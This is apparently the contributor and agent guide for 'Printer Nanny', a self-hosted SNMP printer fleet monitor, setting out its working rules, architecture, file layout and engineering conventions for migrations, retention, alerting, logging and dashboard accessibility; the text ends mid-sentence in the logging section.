# Printer Nanny

Self-hosted fleet management for printers across MSP clients/sites. Monitors
supply levels, errors, status, and page counts over SNMP; tracks maintenance;
alerts to email / Slack / Teams / FreeScout / generic webhook. Multi-tenant
(client → site → subnet → printer), multi-subnet, agent-collected.

## Working agreements (how to build here)
These are standing instructions for anyone (human or agent) doing work in this repo:

**Stance.** You are a master of all code and web design with a perfectionist
touch. Hold that bar on every change — backend logic, SQL, HTML/CSS, and the
operator's experience of the UI alike. Ship work that is correct, secure, and
finished, not merely working. The four rules below are how that stance is
enforced; none of them is optional.

- **Interview, don't assume.** Always interview first. When a decision has real
  alternatives (scope, architecture, scheme, ordering, product direction), ask
  the user before committing to one — don't silently pick. Reserve this for
  genuine forks; keep obvious-default choices moving.
- **Be security-minded at all times.** Treat security as a first-class
  requirement of every change, not a later pass. Assume hostile input from every
  direction — including printers themselves, since SNMP/EWS/PJL strings come from
  devices on client LANs and land in the dashboard, alerts, and exports. Default
  to: authorize and tenant-scope every route, escape every rendered value,
  parameterize every query, never shell out with interpolated input, encrypt
  secrets at rest, keep secrets out of logs/audit detail/HTML, and audit-log
  every security-relevant boundary. When a change touches auth, tenancy,
  secrets, subprocesses, file paths, or outbound URLs, say so explicitly and
  justify the safety of the new path.
- **Always verify, never assume.** Nothing is trusted — not the code, not the
  tests, not an agent's report, not your own prior reasoning. Every change is
  proven: run `ruff`, the pytest suite, AND an end-to-end smoke against a freshly
  seeded throwaway DB (`python -m central.seed` → exercise the feature / run the
  worker). "Tests pass" alone is not enough — check real values/states on seeded
  data. Adversarially re-verify non-trivial work in a fresh checkout. Report
  failures honestly with the output.
- **Parallelize with agents — where it's logical.** Prefer fanning work out across
  multiple agents / a Workflow when it genuinely helps — independent
  implementation, testing, and research run concurrently in isolated git
  worktrees. This lowers overall token usage and wall-clock time versus doing
  everything in one sequential context. Default to it for any multi-feature batch
  or broad search/review; each agent self-verifies, and a separate agent
  adversarially re-verifies before integration. Don't fan out work that one
  context handles better. Treat agent output as a claim to be checked, not a
  result to be trusted.
  - **Worktree verification is unsound by default — pass `PYTHONPATH`.** The
    editable install resolves `printer_nanny_agent` to the **main checkout**, so
    `pytest` inside a worktree tests the *old* agent code while appearing to pass;
    `central` resolves to the worktree only because cwd lands on `sys.path` (run a
    script by absolute path from elsewhere and it silently resolves to main too).
    Verify agent-side work with `PYTHONPATH=<worktree>/agent`, out-of-tree scripts
    with `PYTHONPATH=<worktree>`, and confirm which file you actually imported
    (`inspect.getfile`) before trusting a green run. Corollary for integration:
    `central/` changes are safe to land while other worktree agents run, `agent/`
    changes are not — they retarget every running worktree's agent module.
  - **Skills**: build one when a procedure here is repeated, non-obvious, and
    worth encoding — not speculatively. Every skill must be pertinent and needed;
    prune ones that aren't. Before relying on any skill (new or existing), verify
    it is correct against this codebase — read what it actually does and confirm
    its steps still hold. Never assume a skill is right because it exists or
    because it ran without error.
- **Bump version numbers between changes.** So the running **program** version is
  distinguishable from the **agent** version, bump them on every behavior-changing
  change (a feature batch bumps the minor; a fix bumps the patch; docs/test-only
  changes skip). The two version lines move **independently** — bump the program
  version only when central changes, the agent base version only when the agent
  changes — so e.g. "central 0.4.0 / agent 0.2.0" tells you at a glance which side
  moved.
  - **Program version** (keep these in lockstep with each other): `pyproject.toml`
    `version`, `central/__init__.py` `__version__`, and `central/main.py`
    `FastAPI(version=…)`. Surface it in the dashboard footer.
  - **Agent version**: `agent/printer_nanny_agent/__init__.py` `__base_version__`
    (and `agent/pyproject.toml`); the install-timestamp suffix
    (`0.x.y+YYYYMMDD-HHMMSS`) is appended automatically at install/self-update.
  - Scheme: **SemVer**. (Confirm with the user if a different scheme is wanted.)

## Architecture
- **Central server** (on-prem, Docker Compose): FastAPI JSON API + APScheduler
  worker + HTMX/Jinja dashboard, backed by PostgreSQL (SQLite for local dev/tests).
- **Site agents** (Python, pysnmp): one per site, own one or more subnets. Poll
  printers locally, **push** readings to central over HTTPS, **pull** queued
  commands on heartbeat. No inbound ports needed at sites.
- An agent can serve **multiple clients** when their networks bridge at HQ —
  assign a subnet to another client's site + a bind-IP. Each subnet row carries
  its own SNMP creds (community / v3 USM), so v2c and v3 devices can coexist.
- Data flows agent → `/api/v1/agents/{id}/...` → DB → worker (alerts, reports,
  forecasts) → channels (email / Slack / Teams / FreeScout / webhook).

## Layout
- `central/` — FastAPI app, models, worker, dashboard, notification channels.
  - `api/` — JSON API routers: `ingest`, `management`, `reporting`, `exports`,
    `scim` (SCIM 2.0 provisioning/deprovisioning, off unless configured).
  - `worker/` — APScheduler jobs (heartbeat, alerts, maintenance, forecast,
    retention, directory sync, event delivery, collector-lease takeover).
  - `channels/` — pluggable `NotificationChannel` impls (email, slack, teams,
    freescout, generic webhook). Attachments supported on email for reports.
    Each owns its **own** escaping — see the conventions; there is deliberately
    no shared `escape()`.
  - `events/` — the **typed, signed outbound event bus**: `catalogue.py` (what
    may ever be sent, versioned per type), `signing.py` (the HMAC scheme),
    `destinations.py` (the SSRF boundary), `emit.py` (recording + fan-out and
    the tenancy invariant), `delivery.py` (the wire envelope and the retry
    sweeper, reusing the notification machinery rather than growing a second).
  - `billing.py` / `money.py` — cost-per-page pricing over the meter series, and
    the `Decimal`-end-to-end money type that makes it exact on SQLite too.
  - `reorder.py` — supply reorder **recommendations**, computed on read, stored
    nowhere. Recommend-only is structural, not a matter of discipline.
  - `supply_yield.py` — **yield-gap / non-OEM detection**: pages per cartridge,
    measured between replacements, against what a cartridge should deliver.
    Measurements persist (`supply_cycles`); the verdict is computed on read.
  - `retention.py` — raw-reading retention + the daily rollup.
  - `collector.py` — **collector redundancy**: the per-subnet lease that lets a
    standby agent take over and proves two never collect at once.
  - `branding.py` — per-client white-label resolution and its two sinks.
  - `csv_safe.py` — CSV formula neutralisation, shared by every export.
  - `logging_config.py` — the single `configure_logging()` both processes call.
  - `schema_check.py` — does the live database have the schema this build
    expects? It compares **columns, never `alembic_version`**, because the
    version answers a different question: `docker compose up -d` starts api and
    worker in parallel and only the api runs `alembic upgrade head`, so the
    worker can query a schema that is still being built while the version is
    already moving. That happened in production 2026-08-05 — fifteen revisions
    over 2.4M readings, seven jobs lost to `UndefinedColumn`/`UndefinedTable` in
    the worker's first cycle, every cycle after it clean. The worker now
    `wait_for_schema()`s before its first cycle (bounded, then proceeds loudly —
    an un-migrated install must still boot, because the dashboard is how it gets
    fixed); the api only reports, since it is the process that just migrated.
    `install.sh` runs the CLI and **fails** on drift, replacing a line that
    printed "Migrations … ran on container start" having checked nothing.
    Exit codes are 0 clean / 1 drifted / **2 could not check**, and 2 is not
    success — an unreachable database is not a migrated one.
    Two corrections from a real install, 2026-08-10, where `app_assets` had gone
    missing from a database **already stamped at head**. **Waiting only helps
    while somebody is still migrating**, so `migrations_are_pending()` compares
    the stamp against the script head and the wait gives up at once when they
    match — 300s spent on drift fixes nothing, and this is the one legitimate
    read of `alembic_version` here: it answers *is anybody still migrating*, not
    *does the schema have what we need*, which remains the columns' question
    alone. Reading the head **executes** every revision and 0001 imports
    `migrations.guard`, so it puts the repo root on `sys.path` itself rather
    than inheriting it from WORKDIR — that accident held in the container and
    nowhere else. And **a worker that is waiting is not a worker that is
    wedged**: it writes no liveness stamp while it waits, so a wait longer than
    `health.stale_after_seconds` (180s at the default cadence, against a 300s
    budget) made the dashboard report all fifteen jobs stalled on every restart.
    It now declares itself through `health.WORKER_STARTING_JOB` and reads as
    `starting`, which the banner, `/readyz` and the container probe all honour —
    bounded by the marker's own deadline, because a `starting` that never
    expires would hide a dead worker behind a reassuring word.
  - `dashboard/` — HTMX/Jinja:
    - `routes.py` — overview / client / printer drill-downs, approvals, alerts,
      account, **fleet-wide printer search**, security posture, reorder,
      **customer portal** (`/portal` for client_readonly users).
    - `manage.py` — CRUD for clients, sites, printers, agents, subnets, users,
      **maintenance schedules**, **alert rules** + **audit log** viewer.
    - `people.py` — **end users, groups, and printer assignment** (`/manage/people`).
    - `billing.py` — rate cards and invoice preview/CSV (`/manage/billing`).
    - `events_routes.py` — event subscriptions, secrets, delivery log.
    - `settings_routes.py` — grouped settings tabs (Branding / Notifications /
      Alerts & Reports / Polling & SNMP / Authentication / Agents).
    - `backup_routes.py` — admin-only DB backup & restore.
  - `runtime.py` — spec-driven DB-backed settings (`SPECS`) grouped by
    `SETTINGS_GROUPS`. Env only supplies defaults.
  - `secrets.py` — Fernet encryption-at-rest for stored credentials, keyed off
    `SECRET_KEY`. Self-identifying `enc:v1:…` prefix; legacy plaintext passes
    through `decrypt_value` so upgrades are lazy/no-flag-day.
  - `audit.py` — `record(db, request, user, action, target, detail)` writer used
    at every security-relevant boundary; never raises.
  - `reports.py` — scheduled weekly fleet email + monthly billing CSV.
  - `pkg_builder.py` — assembles the **macOS installer bundle** per client: the
    agent wheelhouse, the LaunchDaemon plist, the install scripts, a freshly
    minted enrollment key in a 0600 `workstation.toml`, and a copy of
    `scripts/build-macos-pkg.sh`. It stops short of a finished `.pkg` because it
    must: `pkgbuild`/`productsign`/`notarytool` are macOS-only and notarytool is a
    closed binary talking to an Apple service, so a Mac is required to sign
    whatever central does. Hand-assembling an unsigned `.pkg` on Linux with
    `xar`+`bomutils` was rejected — neither is packaged in current Ubuntu, and the
    output would still need the Mac.
  - `msi_builder.py` — builds a self-contained Windows `.msi` for an enrolled
    agent in-container (msitools/`wixl`): bundles the Python embeddable runtime
    + agent wheel + NSSM with enrollment baked into `config.toml`; declarative
    `ServiceInstall` (no custom action), Server 2016→2025. Surfaced as a
    "Download Windows MSI" button on the Agents page.
  - `auth_oidc.py`, `auth_oauth_smtp.py` — pluggable SSO + OAuth SMTP.
  - `directory/` — **directory sync**: `base.py` (provider contract +
    `DirectorySnapshot`), `entra.py` / `google.py` / `ad.py`, `registry.py`
    (builds a provider from a connection row; the one place a secret is
    decrypted), `sync.py` (applies a snapshot).
  - `device_definitions.py` — the **device/model definition** data language and
    its validator. Vendored into the agent (`printer_nanny_agent.definitions`)
    and held to it by `tests/test_device_definitions_parity.py`, which asserts
    the *source below the docstring* is identical as well as the behaviour.
  - `dashboard/definitions.py` — the operator surface at `/manage/definitions`.
  - `snmp_parse.py` — brand-agnostic SNMP supply/level parsing (shared w/ agent).
  - `snmp.md` — Printer-MIB OID reference.
  - `static/` — **vendored** `tailwind.css` + `htmx.min.js`, served at `/static`.
    Committed build artifacts; regenerate with `scripts/build-assets.sh`.
  - `dashboard/templates/_components.html` — the UI component layer: button /
    card / table / heading / form-field macros. **Use these rather than writing
    Tailwind strings inline**; that drift is what the layer exists to stop.
- `agent/` — standalone `printer-nanny-agent` package.
  - `providers/` — vendor-specific enrichment plugins; one registered per
    enterprise prefix. **Brother is consolidated**: a single `brother`
    provider sequences four passes internally (maintenance blob → live
    alert + history events → PJL → EWS), skipping the network fallbacks
    once exact percentages exist.
  - `platforms/` — the **only** per-OS code in the workstation client:
    `windows.py` (a thin re-export of the hardware-proven spooler code),
    `macos.py` (CUPS), `unsupported.py` (a backend, not an exception — the
    client must run on a dev box far enough to fail with a sentence).
    Everything else — enrollment, the machine GUID, the poll loop, spec
    mapping, driver fetch/verify, `ProvisionReport` and every skip reason — is
    identical everywhere and stays in `workstation_service`. A backend declares
    what it can do (`SUPPORTS_VENDOR_DRIVERS`, an optional `make_runner`) rather
    than the orchestrator branching on `sys.platform`, so a Mac neither builds a
    PowerShell runner nor unpacks a Windows driver archive it cannot stage.
  - `definitions.py` + `providers/definitions.py` — the agent half of
    server-pushed model definitions: the vendored validator, the signed local
    cache, and the provider that applies them. Registered **last** in the
    registry, which is what makes the precedence rule true rather than merely
    documented.
  - `mdns.py` — optional Bonjour/DNS-SD discovery (`agent[mdns]` extras).
  - `updater.py` — self-update via `update_agent` command; writes
    `.pn-update-result.json` so the dashboard can show success/failure.
- `migrations/` — Alembic environment + versions (0001 → 0043). Revision 0001 is
  `Base.metadata.create_all()`, so **the ORM metadata is what builds a fresh DB** —
  an index declared only in a later migration is silently absent on new installs.
  Declare indexes in the model's `__table_args__` and mirror them in the migration.
  **The chain must stay a single walkable line** — one base, one head, no forks,
  no cycles, no dangling parent — and `tests/test_migration_chain.py` asserts all
  five. This is not tidiness: a fork makes alembic report "Multiple head
  revisions are present" and **refuse to upgrade at all**, while nearly every
  test still passes, because most fixtures build their schema with `create_all`
  and revision 0001 *is* `create_all`. Ten revisions authored concurrently is
  exactly how a fork happens, so do not pin a parent by name in a test either —
  revisions land in a different order than their assigned slots, and pinning
  names a coordination artifact rather than the property that has to hold.
- `deploy/` — Caddyfile, installer scripts (`install-agent.sh`/`.ps1`,
  `install-workstation-macos.sh`), sample systemd unit and launchd plists,
  `macos-pkg/` (the `preinstall`/`postinstall` the `.pkg` runs as root — the same
  files that ship, never a second copy), plus `WINDOWS-MSI-TESTING.md` (build +
  Server 2016→2025 smoke, and the 2026-07-30 real-spooler run with the three
  defects it found) and `MACOS-CLIENT-TESTING.md` (real-CUPS verification, the
  `.pkg` procedure, and the 2026-07-30 real-Mac run — done items marked and dated,
  the rest still open).
- `tests/` — pytest suite, serial, on SQLite locally and **also on real Postgres
  in CI** (`.github/workflows/postgres.yml`).
  **Quote the machine with the number**, always — a bare figure is
  unfalsifiable, which is how a run on a *busy* box (9min) once got reported as
  a regression against a documented one.
  - **Measured 2026-08-03 on `claude/completion-program` @ `b970ba5`**, Apple M2
    Max (12 cores), macOS 26.5.2, Python 3.9.6, unpiped, both backends:
    - SQLite: **2811 passed / 39 skipped in 390s (6:30)**, exit 0.
    - Postgres 16 (throwaway container): **2825 passed / 25 skipped in 459s
      (7:39)**, exit 0.
    Both collect 2850. The skip counts differ *by design* and the totals
    reconcile: `postgres_only` tests skip on SQLite and `sqlite_only` tests skip
    on Postgres. A run where both numbers match is the thing to distrust — it
    means one of the two marks stopped being applied.
  - The GitHub-runner (~2.5min) and 4-vCPU-container (~6-7min) figures below
    this line were measured at ~1770 tests and have **not** been re-measured
    since the suite grew by ~45%; treat them as stale, not as targets.
  - Likewise **not re-measured**: that ~80% of the wall clock is
    `create_all`/`drop_all` rebuilding the schema per fixture (282s of 353s
    across 744 rebuilds), and that password hashing is **1.8%**. Both were
    measured at the old size. The *shape* of the finding is what to carry
    forward — the total tracks single-core speed, and the schema rebuild is the
    first thing to attack if it ever needs to be faster; the obvious suspect was
    not the culprit.
  `test_compose_deployment.py` / `test_install_update.py` cover the deployment
  contract above; both skip cleanly where the docker CLI is absent.
  `test_macos_deployment.py` does the same for the LaunchDaemon plist and its
  installer — a malformed plist is refused by launchd in silence, and a
  credential in `ProgramArguments` is readable by every local user, so neither
  failure shows up anywhere at runtime.

## Conventions
- Python 3.12 in Docker; code stays 3.9-compatible (`from __future__ import
  annotations`) so it runs on the local system Python too.
- Sync SQLAlchemy 2.0 (`Mapped[]` style) + Alembic. Sessions via
  `central.db.SessionLocal` / the `get_db` FastAPI dependency.
- **A `server_default` must render per dialect, and a boolean is where that
  bites.** `server_default=text("1")` on a `Boolean` renders as an unquoted
  integer; SQLite accepts it, Postgres refuses it outright —
  `psycopg.errors.DatatypeMismatch: column "allow_breakthrough" is of type
  boolean but default expression is of type integer`. Since revision 0001 is
  `create_all()`, the ORM declaration *is* what builds a fresh database, so this
  was not a cosmetic declaration issue: `alembic upgrade head` against a fresh
  Postgres could not create the schema at all, and had not been able to since
  0.12.0. Use `true()`/`false()`, which render `1` on SQLite and `TRUE` on
  Postgres. The whole suite passed over it because the whole suite ran on
  SQLite — the same zero-Postgres blindness this repo already paid for four
  times on the Windows client, arrived at from the database side.
  `tests/test_postgres_bootstrap.py` compiles the real metadata against the
  Postgres *dialect* rather than requiring a live server (a test that needs
  Postgres gets skipped exactly where it is needed) and asserts on **rendered
  DDL**, so it catches every spelling that produces a numeric default rather
  than one blacklisted idiom.
- **`DATABASE_URL` must never travel through ConfigParser.** `migrations/env.py`
  deliberately does *not* call `config.set_main_option("sqlalchemy.url", …)`:
  that writes through alembic's ConfigParser, whose `BasicInterpolation` reads
  `%` as a directive, so a percent-encoded character in a password (`p%40ss` is
  simply how you put an `@` in a Postgres URL) raises `ValueError: invalid
  interpolation syntax` while `env.py` is still *importing* — before a single
  migration runs, and equally for `current`, `history` and the offline `--sql`
  path. `docker-compose.yml` builds `DATABASE_URL` straight out of
  `POSTGRES_PASSWORD` and the api container boots with `alembic upgrade head &&
  …`, so a strong password containing `@`, `/` or `#` bricked the container on
  first boot with a stack trace naming ConfigParser and never the password. The
  line is *deleted* rather than escaped to `%%`, because nothing reads the
  option — both paths in that file carry the URL themselves — and leaving a live
  ConfigParser round trip in the path of a credential just waits for the next
  person to write `set_main_option`.
- API is versioned under `/api/v1`. Agents authenticate with a per-agent API key
  (`Authorization: Bearer <key>`, hashed at rest). Dashboard users use signed
  sessions + roles (`admin` / `tech` / `client_readonly`).
- Time-series lives in `readings`, append-only, with a composite `(printer_id,
  ts)` index — every hot query on it is "one printer, a time range". That index
  is **new in 0034**: this line asserted it for a long time while the schema had
  only two single-column indexes, so Postgres read every reading a printer had
  ever produced and filtered by `ts`. Measured on 300k rows / 500 printers: 317
  buffers with it, 593 without. On Postgres a BRIN index on `ts` keeps range
  scans cheap (migration 0002). Neither `readings` nor anything else is
  **partitioned** — `models.Reading` and `db.create_all` both used to claim
  Postgres range-partitioned it monthly, and it never has; 0002 deferred
  partitioning explicitly and shipped BRIN instead.
- **Retention is a rollup, and deletion is opt-in** (`central/retention.py`,
  `reading_rollups`). Raw readings are kept `retention.raw_days` (90) and then
  collapse to one row per printer per UTC day, kept forever. Four rules, each
  because its opposite loses data quietly:
  - **The rollup UPSERT and the DELETE of the rows it summarises are one
    transaction**, so there is no ordering to get wrong — the rollup commits iff
    the readings are gone, and a crash re-does that printer-day from untouched
    raw rows. `retention.delete_enabled` ships **False**; every pass that
    deletes writes a `readings.pruned` audit row, and a refusal writes
    `readings.prune_refused`.
  - **Deletion is by explicit id, never by predicate.** `ReadingIn.ts` is
    client-supplied, so an agent can backdate a push; re-issuing the range
    predicate would destroy a row inserted between the SELECT and the DELETE
    without ever counting it. A straggler instead survives to the next pass, and
    `raw_pruned` is what selects the write rule there — False recomputes the day
    from the raw rows, True *merges*, because recomputing a pruned day would
    keep the straggler and discard the day.
  - **Work is bounded per cycle** (`retention.max_batches_per_cycle`). The
    worker holds a single-leader lock, so one `DELETE` over 52M rows stalls
    alerting for the whole fleet; each delete covers one printer-day. The job is
    registered **last** in `JOBS` and needs no schedule: an idle pass is one
    `MIN(ts)` index probe.
  - **`retention.raw_days` has a floor computed from the forecast's own window**
    (`min_raw_days()`), not a literal 30. Supply-runway estimates read raw
    readings *only*, over 30 days; a shorter raw window starves every estimate
    without failing anywhere. Below the floor the worker logs and uses the floor
    — clamping in silence is indistinguishable from no guard. Rollups carry
    per-supply levels they do not need today for the same reason: widening the
    forecast window past 90 days would otherwise return the 90-day answer
    forever, with nothing to grep.
- SNMP is brand-agnostic via RFC 3805 Printer MIB. Vendor providers add real
  percentages where the standard MIB only reports buckets (Brother) or
  brand-tag/status-message scalars (HP, Lexmark, Xerox, Kyocera, Canon, Ricoh,
  Konica Minolta). SNMPv3 USM creds per subnet, passwords encrypted at rest.
- Operational config (channels, alert thresholds, polling, SNMP defaults, SSO,
  reports, branding, agent install source) lives in DB via `central/runtime.py`
  and is edited in the Settings UI **grouped into tabs**. Only `DATABASE_URL` +
  `SECRET_KEY` come from env (`central/config.py`).
- **`docker-compose.yml` is upstream's file, and operators must never need to
  edit it.** `install.sh --update` fast-forwards it, so an operator edit is a
  guaranteed future conflict — which is exactly how one of them got permanently
  locked out of updates. Deployment knobs are therefore `${VAR:-default}`
  interpolations fed from `.env` (credentials, ports, image tags,
  `WORKER_INTERVAL`), and anything they can't express goes in a gitignored
  `docker-compose.override.yml` that Compose merges automatically. When adding a
  knob, add the variable — never a new literal. A variable's default must read
  identically everywhere it appears (`POSTGRES_USER` spans the db service, both
  `DATABASE_URL`s and the healthcheck); drift there yields a stack that builds
  clean and then can't authenticate, so `tests/test_compose_deployment.py`
  asserts single-valued defaults across the whole file.
- **UI consistency is enforced by a component layer, not by discipline.**
  `_components.html` owns the class strings for buttons, cards, tables, headings
  and form fields. Before it, the same element was spelled many ways — 30
  distinct button strings across two competing "primary" colours (`slate-900`
  *and* `sky-600`), 30 card variants, 20 table-header variants. No page was
  wrong on its own; the drift only showed when an operator moved between pages.
  Button variants are named for **intent** (`primary` / `accent` / `danger` /
  `warning` / `success` / `neutral` / `subtle`), so a page picks by meaning and
  the palette stays a single decision.
- **A placeholder is not a label, and a sibling `<label>` is not an
  association.** Both mistakes render identically to a sighted mouse user and
  are invisible to grep, which is how 85 controls ended up with no accessible
  name. Two associations are valid: a label that **wraps** its control (what the
  `field` macro emits — it needs no `id`, so it is safe inside the per-row loops
  this app renders, where duplicate ids would silently mis-associate every row
  after the first), or `label[for]` pointing at a unique `id`. For controls in a
  table row, where a visible label would just repeat the column header, use
  `aria-label` **including the row's identity** ("SNMP community for
  10.0.0.0/24") — the field name alone identifies nothing when six rows are on
  screen. `tests/test_dashboard_a11y.py` asserts this against the rendered DOM,
  because only the rendered tree can tell a wrapping label from an adjacent one.
- **Two class names in `_components.html` are load-bearing layout, not styling,
  and both failures are invisible until a narrow viewport.** `card_cls` emits
  `min-w-0` because grid/flex items default to `min-width: auto` and refuse to
  shrink below their content — a card holding a wide table grows to the table's
  width and takes the page with it, and the `overflow-x-auto` inside it *never
  scrolls* because it was handed all the width it asked for. `table_wrap` emits
  `relative` because Tailwind's `sr-only` is `position: absolute`: with no
  positioned ancestor it resolves against the viewport, escapes the scroller,
  and contributes its offset to page width — a 1px hidden `<span>` naming an
  actions column widened `/manage/users` by 60px. `tests/test_dashboard_a11y.py`
  asserts both. Verify responsive changes by driving Chromium at 375px and
  checking the *viewport* actually scrolls (`window.scrollTo(9999,0)` then read
  `scrollX`); `documentElement.scrollWidth` alone reports contained overflow too.
- **Every interactive control carries a visible focus ring.** There were
  previously zero focus styles across 734 keyboard-reachable elements, leaving
  keyboard operation dependent on whatever the browser drew by default —
  routinely invisible on this app's dark and coloured buttons. The macros use
  `focus-visible`, not `focus`, so a mouse click does not leave a ring behind.
- **The nav says where you are.** Thirteen identical links with no current-page
  indicator was the most-reported UI complaint. Active state is **longest-prefix**
  (`/manage/agents` marks *Agents*, not *Manage*), carried both visually and as
  `aria-current="page"`, and the bar wraps instead of running its admin links off
  the right edge at laptop widths.
- **The dashboard renders with no internet, so frontend assets are vendored.**
  Tailwind and htmx load from `central/static/`, never a CDN. This is not
  preference: installs sit on segmented MSP management VLANs with no egress, and
  loading them from `cdn.tailwindcss.com` / `unpkg.com` gave exactly those
  operators an unstyled dashboard in which every htmx-driven control was inert —
  a total failure on the deployments least able to report it. It also drops
  Tailwind's in-browser compiler (upstream documents it as development-only) for
  a ~21KB tree-shaken stylesheet. **Tailwind is pinned to v3**; v4 renames
  utilities this codebase uses (`shadow`→`shadow-sm`, `rounded`→`rounded-sm`) and
  shifts the palette, so an unpinned bump silently restyles every page.
  The catch worth internalising: the CSS is tree-shaken **against the templates**,
  so a class no template used at build time is simply *absent* — the element
  renders unstyled with no error, nothing in the console, nothing to grep.
  After changing any Tailwind class, run `scripts/build-assets.sh` and commit the
  result. `tests/test_static_assets.py` fails on both a re-added CDN reference and
  a class missing from the vendored CSS, so a forgotten regeneration is caught by
  the suite rather than by an operator. Node is **build-time only** — deliberately
  absent from `deploy/Dockerfile` and the runtime path.
- **Dev-only services stay behind a profile.** `mailhog` accepts unauthenticated
  mail and serves an unauthenticated UI of everything it caught; it published
  `:8025` on every production install until it was made opt-in. The default
  `docker compose up` is the minimum production stack (db + api + worker) and
  publishes exactly one host port.
- **The updater's contract: a failed update changes nothing.** It stashes local
  edits, fast-forwards, re-applies. If the re-apply conflicts it unwinds
  *completely* — back to the original commit with the edits restored — because
  a failed `git stash pop` otherwise leaves conflict markers in the tree and
  strands the operator's work in a stash nobody mentioned, and
  `docker compose build` would happily consume a compose file containing
  `<<<<<<<`. Never let the update path exit having half-applied something.
  `--pull-only` stops before Docker, which is also what makes the path testable
  without a daemon (`tests/test_install_update.py`).
- **Quiet hours / maintenance windows** (`central/suppression.py`,
  `suppression_windows`). One model covers both: recurring weekly quiet hours
  (weekday mask + local minutes-from-midnight, wrap-aware) and one-off dated
  maintenance ranges (absolute UTC). `evaluate()` returns dispatch / defer /
  suppress. **Recurring windows are wall-clock-local to the scoped client**
  (`clients.timezone`, else `alerts.default_timezone`), so a single global
  "18:00–07:00" gives every client its own night; an unresolvable zone degrades to
  UTC and never raises. A wrapped window's weekday mask gates its **start** day —
  a Fri-night window still covers 03:00 Saturday. `defer` writes one idempotent
  `deferred` delivery row whose `next_attempt_at` is the window's end, so the
  existing retry sweeper is the wake mechanism and `flush_quiet_hours` releases it
  as **one digest per client**; `suppress` writes a terminal `suppressed` row
  (recorded, not merely absent). `allow_breakthrough=False` is total silence —
  it's a separate flag because `critical` is the top of `EventSeverity`, so a
  floor alone can only ever loosen a window.
- **Alert noise is damped, and non-delivery is never called delivery.** Two
  independent mechanisms, because neither covers both shapes: a *deadband*
  (`alerts.supply_deadband_pct`) holds a live low-supply alert until the level
  climbs that margin above the threshold, and a *flap cooldown*
  (`alerts.renotify_cooldown_min`) folds a re-fire of any condition back into the
  alert it already raised — bumping `alerts.flap_count`, deliberately **not**
  re-notifying, and leaving `last_notified_at` alone so escalation still measures
  from the real notification. Error alerts are one-per-distinct-code (capped by
  `alerts.max_error_alerts_per_printer`, overflow disclosed in the detail, never
  dropped silently). On the delivery side `ChannelResult.sent` is separate from
  `ok` — "did a message leave the building" vs "did anything go wrong" — so a
  severity skip or unconfigured dry-run terminates as `DeliveryStatus.skipped`
  rather than `delivered`. When adding a channel or an early-return, anything
  that reports success without transmitting **must** set `sent=False`.
- **A channel must read its credential through `setting()`, not from env.**
  `active_channels` builds every Settings-page channel with `config={}` and
  passes the operator's values in `runtime`, so a channel that reads
  `self.config` and then falls through to `central.config.settings` skips the
  only layer the UI ever writes. `TeamsChannel._webhook` did exactly that: an
  operator who enabled Teams and pasted a webhook URL got a **permanent silent
  dry-run** — `ok=True`, nothing transmitted, and the setting page apparently
  working. `setting()` is the shared helper that spells the precedence once
  (row config → runtime → default); Slack and the generic webhook always used
  it. The `sent=False` rule above is what kept this honest rather than
  fraudulent — the dry-run was recorded as `skipped`, not `delivered` — but it
  is a rule about *reporting*, and it cannot make a misconfigured read deliver
  anything. Test the wiring through `active_channels`, never by constructing the
  channel directly: direct construction is the one path that never had the bug.
- **Occurrence-rate alerting asks a different question from every other rule,
  and that changes what damping means.** `AlertConditionType.occurrence_rate`
  counts matching `printer_events` in a rolling window (`alert_rules.
  window_minutes`, `match_code`, `match_min_severity`; `threshold` is the count
  N) — "not every jam, but ten jams a day". `printer_events` is the *only*
  counting source, and it already has the right shape: `_reconcile_events`
  refreshes a standing snmp_alert condition **in place** and inserts a new row
  only once it has cleared, so a printer jammed for a day is one occurrence and
  a printer that jams and is cleared twelve times is twelve. Four rules follow,
  and each exists because the alert spine's existing damping was built for
  *state* conditions:
  - **The count is the alert's content, so dedupe must not freeze it.** A live
    rate alert's detail is rewritten each cycle with the current count (never
    re-notified — escalation already covers "still not fixed"). Without that,
    an alert that opened at 10/day sits in front of the operator saying 10 while
    the printer is at 60: the alert asserting something untrue, not merely stale.
  - **The flap cooldown is capped at the rule's own window.** Folding claims
    "same incident", and for a rate condition that is true exactly while the two
    firings count overlapping events. A 10-minute "5 jams" rule under the shipped
    30-minute cooldown would otherwise have a genuinely new burst — five fresh
    jams sharing not one event with the previous alert — folded in silently, the
    damping mechanism defeating the feature that exists to measure repetition.
    The cap can only ever *shorten*; a 24h-window rule keeps the operator's 30m.
  - **Hysteresis is mandatory here, not optional.** A rolling window sheds
    occurrences by itself, so with no margin every rate alert resolves the moment
    the oldest event ages out and re-opens on the next one — flapping by
    construction. `alerts.occurrence_clear_margin_pct` (default 25) holds it open
    until the count falls that far below N, and the hold is stated on the alert
    rather than being silent.
  - **The window is bounded at both ends.** A rule with no window is skipped
    rather than defaulted, and `OCCURRENCE_MAX_WINDOW_MINUTES` clamps in the
    evaluator as well as the form — an unwindowed count is the append-only
    full-table scan `FORECAST_HISTORY_WINDOW_DAYS` already had to be walked back
    from. Counting is ONE grouped query per rule (not per printer), joined to
    `printers` for scope rather than an `IN (:ids)` list that overruns SQLite's
    999-variable limit on a real fleet. `match_code` is escaped before it reaches
    a `LIKE`: an unescaped `%` silently turns a narrow rule into "match
    everything", which fails *open*.
  Alert rules also finally have an operator surface (`/manage/alert-rules`).
  There was none before — the four defaults came from `seed.py` and the only way
  to change a threshold was SQL, which is survivable when a condition is one
  number and not when it is three decisions with no defensible default.
- Secret-typed settings + SNMPv3 USM passwords are **encrypted at rest** with
  a Fernet key derived from `SECRET_KEY`. Lazy migration: legacy plaintext is
  swept into encrypted form on every save and at api startup.
- **Logging is configured in one place (`central/logging_config.py`), and the
  verbosity knob deliberately cannot reach a dependency.** The worker called
  `logging.basicConfig` in its `main()`; the api configured logging **nowhere**,
  so in the api container every `log.info()` under `central/` went to the floor
  and warnings arrived through `logging.lastResort` — bare `%(message)s`, no
  timestamp, no level, no logger name. Verified before/after against a real
  `uvicorn central.main:app`: a self-registration that plainly *happened* (agent
  created, HTTP 200) logged **nothing**. Both processes now call
  `configure_logging()`; two `basicConfig` copies are exactly the drift this
  repo keeps paying for. Three properties are load-bearing. **`LOG_LEVEL` moves
  `central`/`printer_nanny` only, never root** — `httpx` logs the full request
  URL at INFO and a Slack / Teams / webhook URL *is* the credential, and
  SQLAlchemy logs bound parameters (password hashes, Fernet ciphertext) at
  DEBUG, so an allowlist makes both impossible rather than filtered and a
  dependency added later cannot reopen it. Root keeps its WARNING default, and a
